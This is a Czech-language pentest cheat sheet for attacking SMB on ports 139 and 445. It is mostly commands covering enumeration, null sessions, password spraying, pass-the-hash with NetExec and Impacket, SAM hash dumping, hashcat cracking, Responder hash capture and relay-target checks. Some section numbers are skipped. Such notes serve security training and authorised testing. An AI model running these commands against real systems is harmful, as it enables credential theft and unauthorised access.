# SMB (139 / 445)

## 🖥️ Základní informace

**SMB (Server Message Block)** je protokol používaný Windows pro:

- sdílení souborů
- tiskárny
- vzdálenou správu
- komunikaci mezi Windows stroji

Porty:

|Port|Technologie|
|---|---|
|TCP 445|SMB Direct (moderní SMB)|
|TCP 139|SMB přes NetBIOS|

---

## Verze SMB

|Verze|Poznámka|
|---|---|
|SMBv1|Starý, nebezpečný, často vypnutý|
|SMBv2|Windows Vista+|
|SMBv3|Moderní Windows|

Nebezpečné:

- SMBv1
- guest access
- slabé ACL
- povolený NTLM

---

# 🔍 1. Enumerace SMB

## Nmap základ

```
nmap -p139,445 -sV -sC <IP>
```

Více SMB skriptů:

```
nmap --script smb-* -p445 <IP>
```

---

## Zjištění OS a domény

```
nmap --script smb-os-discovery -p445 <IP>
```

Výstup může ukázat:

```
Computer name: DC01
Domain: CORP.LOCAL
OS: Windows Server 2022
```

---

# 📂 2. Enumerace Shares

SMB share = sdílená složka.

Typické:

|Share|Význam|
|---|---|
|ADMIN$|vzdálená administrace|
|C$|celý disk|
|IPC$|komunikace RPC|
|SYSVOL|doménové skripty|
|NETLOGON|logon skripty|

---

## Anonymous listing

```
smbclient -N -L //<IP>
```

Výsledek:

```
Sharename       Type
---------       ----
public          Disk
IPC$            IPC
```

---

## Připojení ke share

```
smbclient //<IP>/public
```

---

Příkazy:

```
ls
```

```
get file.txt
```

```
put test.txt
```

```

```

# 🔓 5. Null Session

Null session = SMB přístup bez účtu.

Test:

```
smbclient -N //<IP>/IPC$
```

Nebo:

```
rpcclient -U "%" <IP>
```

Potom:

```
enumdomusers
```

---

Co může uniknout:

- seznam uživatelů
- skupiny
- informace o doméně

# 🔑 7. Password Spraying / Brute Force

SMB často používá:

- NTLM
- Kerberos (v AD)

---

## NetExec (CME)

Moderní náhrada CrackMapExec:

Spraying:

```
netexec smb <IP> -u users.txt -p 'Password123!'
```

Lokální účty:

```
netexec smb <IP> \
-u administrator \
-p password \
--local-auth
```

---

Úspěch:

```
[+] CORP\john:Password123!
```

Admin:

```
(Pwn3d!)
```

# 🔐 9. Pass-the-Hash přes SMB

NTLM hash = alternativa k heslu.

Nemusíš znát plaintext.

---

## NetExec

```
netexec smb <IP> \
-u Administrator \
-H <NT_HASH>
```

---

## Impacket

```
impacket-psexec \
Administrator@<IP> \
-hashes :<NT_HASH>
```

---

# 📥 10. SAM Dump přes SMB

Pokud máme admin práva:

```
netexec smb <IP> \
-u admin \
-p password \
--sam
```

Získáme:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:NTLMHASH
```

---

Crack:

```
hashcat -m 1000 hashes.txt rockyou.txt
```

---

# 🎣 11. Forced Authentication

SMB může být zneužito k získání NetNTLM hashů.

Používá:

- LLMNR
- NBT-NS
- WPAD

Schéma:

```
Oběť
 |
 | SMB request
 |
Útočník (Responder)
 |
 | zachytí hash
 |
Hashcat
```

---

Responder:

```
sudo responder -I eth0
```

Výsledek:

```
USER::DOMAIN:HASH
```

Crack:

```
hashcat -m 5600 hash.txt rockyou.txt
```

---

# ⚠️ 12. SMB Relay Attack

Pokud:

- SMB signing vypnutý
- NTLM povolený

místo crackování hashe ho lze přeposlat.

Kontrola:

```
netexec smb <IP> --gen-relay-list targets.txt
```

Hledáme:

```
SMB signing: False
```
